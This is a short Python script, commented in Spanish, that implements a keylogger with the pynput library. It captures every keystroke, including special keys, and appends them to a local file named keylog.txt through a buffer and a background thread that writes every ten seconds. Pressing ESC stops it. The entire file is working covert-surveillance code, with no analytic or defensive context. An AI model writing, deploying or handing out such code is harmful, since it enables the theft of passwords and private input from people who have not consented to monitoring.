# pip install pynput

from pynput import keyboard
import threading

log_file = "keylog.txt"
buffer = []
lock = threading.Lock()

def write_to_file():
    global buffer
    with lock:
        if buffer:
            with open(log_file, "a") as f:
                f.write("".join(buffer))
            buffer = []

def on_press(key):
    global buffer
    try:
        char = key.char if key.char else f"[{key.name}]"
    except AttributeError:
        char = f"[{key}]"

    with lock:
        buffer.append(char)

    # Guarda en el archivo si el buffer alcanza un tamaño significativo
    if len(buffer) >= 10:
        write_to_file()

def on_release(key):
    # Detiene el keylogger si se presiona la tecla ESC
    if key == keyboard.Key.esc:
        write_to_file()  # Guarda cualquier dato restante antes de salir.
        return False

# Hilo que guarda periódicamente en el archivo
def periodic_write(interval=10):
    while True:
        threading.Event().wait(interval)
        write_to_file()

# Inicia la captura de teclas y el hilo de escritura periódica.
if __name__ == "__main__":
    write_thread = threading.Thread(target=periodic_write, daemon=True)
    write_thread.start()

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()